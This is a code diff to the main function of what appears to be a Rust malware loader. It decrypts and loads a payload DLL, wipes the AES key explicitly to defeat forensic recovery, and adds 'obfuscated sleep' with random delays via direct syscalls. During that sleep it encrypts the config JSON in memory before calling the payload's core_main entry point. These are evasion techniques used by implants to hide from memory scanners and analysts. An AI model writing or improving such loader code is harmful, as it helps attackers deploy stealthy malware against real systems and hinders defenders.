@@ -94,9 +94,9 @@ fn main() {
         }
     };
 
-    // 8. Zeroize AES key from memory (prevent forensic recovery)
-    for b in aes_key.iter_mut() { *b = 0; }
-    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
+    // 8. Zeroize AES key from memory (prevents LLVM from optimizing away the wipe)
+    use zeroize::Zeroize;
+    aes_key.zeroize();
 
     // 9. Validate PE/ELF header
     if dll_bytes.len() < 2 {
@@ -122,14 +122,23 @@ fn main() {
         }
     };
 
-    // 11. Obfuscated sleep (random 1-5s delay via direct syscall)
+    // 11. Call entry point with config JSON
+    let config_bytes = loader_cfg.config_json.as_bytes();
+
+    // 12. Obfuscated sleep (random 1-5s delay, encrypts sensitive data via isolated thread)
     {
+        // Register config JSON for sleep-time encryption
+        unsafe {
+            sleep_obfuscation::register_region(
+                config_bytes.as_ptr() as *mut u8,
+                config_bytes.len(),
+            );
+        }
         let delay_ms = 1000 + (rand::random::<u64>() % 4000);
         sleep_obfuscation::obfuscated_sleep(std::time::Duration::from_millis(delay_ms));
     }
 
-    // 12. Call entry point with config JSON
-    let config_bytes = loader_cfg.config_json.as_bytes();
+    // 13. Call core_main
     entry_fn(config_bytes.as_ptr(), config_bytes.len());
 
     // Should not return, but if it does:
